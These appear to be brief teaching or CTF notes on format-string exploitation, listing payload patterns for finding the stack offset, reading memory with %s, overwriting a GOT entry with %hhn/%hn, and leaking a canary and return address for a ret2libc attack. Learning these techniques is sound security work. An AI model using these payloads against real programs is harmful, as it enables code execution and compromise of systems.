# Worked examples — the numbers

## Offset find
AAAA.%1$p → arg1; AAAA.%6$p → arg6; AAAA.%8$p → 0x41414141 → N=8.

## %s arb-read
Plant &flag as arg 8; send %8$s → prints *flag_addr = the flag bytes.

## %n GOT write
Plant &puts_got as arg 8; send %<low-byte>c.%8$hhn → writes the low byte
of system into puts's GOT slot. Repeat per byte (or %hn for 2).

## Leak → smash
%p.%p.%p → word[3]=canary, word[6]=ret-addr; feed into a ret2libc smash.
